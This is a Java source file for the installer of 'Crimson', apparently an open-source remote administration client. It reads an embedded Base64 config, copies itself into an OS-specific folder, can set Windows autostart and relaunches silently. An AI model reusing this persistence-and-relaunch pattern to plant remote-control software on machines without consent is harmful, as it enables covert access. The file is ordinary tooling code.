/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client;

import static com.subterranean_security.crimson.universal.Flags.DEV_MODE;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Base64;

import com.subterranean_security.crimson.client.modules.Autostart;
import com.subterranean_security.crimson.core.platform.Platform;
import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.universal.Universal;
import com.subterranean_security.crimson.universal.util.JarUtil;

public class Installer {

	public static ClientConfig ic;
	private static OSFAMILY os;

	//
	private static File base;
	private static File client;

	public static void main(String[] args) {

		if (isInstalled()) {
			Client.main(args);
			return;
		}

		// don't use method in TempUtil because it loads unnecessary code
		File temp = new File(System.getProperty("java.io.tmpdir") + "/client_install");
		temp.mkdir();

		try {
			Universal.loadTemporarily("/com/subterranean_security/crimson/client/res/bin/lib.zip", temp);
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
			System.exit(1);
		} catch (SecurityException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
			System.exit(1);
		}

		os = Platform.osFamily;

		try {
			ic = readInternal();
		} catch (Exception e) {
			System.out.println("Fatal: Could not read internal.txt");
			System.exit(1);
		}

		switch (os) {
		case SOL:
			client = new File(filterPath(ic.getPathSol()));
			break;
		case BSD:
			client = new File(filterPath(ic.getPathBsd()));
			break;
		case LIN:
			client = new File(filterPath(ic.getPathLin()));
			break;
		case OSX:
			client = new File(filterPath(ic.getPathOsx()));
			break;
		case WIN:
			client = new File(filterPath(ic.getPathWin()));
			break;
		default:
			break;
		}
		base = client.getParentFile();

		try {
			if (install()) {
				System.out.println("Install Success");
			} else {
				System.out.println("Install Failed");
			}
		} catch (IOException e) {
			System.out.println("Install Failed:");
			e.printStackTrace();
		}
		FileUtil.delete(temp);

	}

	private static String filterPath(String path) {
		return path.replace("%USERNAME%", System.getProperty("user.name")) // username
				.replace("%USERHOME%", System.getProperty("user.home")); // userhome
	}

	public static boolean packagedLibsFound() {
		return Installer.class.getResourceAsStream("/com/subterranean_security/crimson/client/res/bin/lib.zip") != null;
	}

	private static ClientConfig readInternal() throws Exception {
		InputStream in = Client.class.getResourceAsStream("/com/subterranean_security/crimson/client/internal.txt");

		BufferedReader input = new BufferedReader(new InputStreamReader(in));

		ClientConfig cc = ClientConfig.parseFrom(Base64.getDecoder().decode(input.readLine()));
		input.close();

		return cc;
	}

	public static boolean isInstalled() {
		if (!new File(Universal.jar.getParent() + "/var/client.db").exists()) {
			return false;
		}

		if (!new File(Universal.jar.getParent() + "/lib/java/c09.jar").exists()) {
			return false;
		}

		return true;
	}

	public static boolean install() throws IOException {
		System.out.println("Starting installation");

		System.out.println("Installing to: " + base.getAbsolutePath());

		if (!base.exists() && !base.mkdirs()) {
			System.out.println("Failed to create install base");
			return false;
		}

		for (File f : base.listFiles()) {
			if (!f.getName().equals("var")) {
				FileUtil.delete(f);
			}
		}

		(new File(base.getAbsolutePath() + "/var")).mkdirs();
		(new File(base.getAbsolutePath() + "/tmp")).mkdirs();
		(new File(base.getAbsolutePath() + "/lib")).mkdirs();

		System.out.println("Extracting lib.zip");

		JarUtil.extract("com/subterranean_security/crimson/client/res/bin/lib.zip",
				base.getAbsolutePath() + "/lib/lib.zip");
		JarUtil.extract(new FileInputStream(base.getAbsolutePath() + "/lib/lib.zip"), base.getAbsolutePath() + "/lib/");

		System.out.println("Extracting client database");
		File db = new File(base.getAbsolutePath() + "/var/client.db");
		if (!db.exists()) {
			JarUtil.extract("com/subterranean_security/crimson/client/res/bin/client.db", db.getAbsolutePath());
		}

		System.out.println("Copying client jar");
		FileUtil.copy(Universal.jar, client);

		if (ic.getAutostart()) {
			switch (os) {
			case SOL:
			case BSD:
			case LIN:
			case OSX:
				break;
			case WIN:
				Autostart.install_win(client);
				break;
			default:
				break;

			}
		}

		if (!DEV_MODE) {
			Runtime.getRuntime().exec(os.getJavaw() + " -jar " + client.getAbsolutePath());
		}

		return true;
	}
}
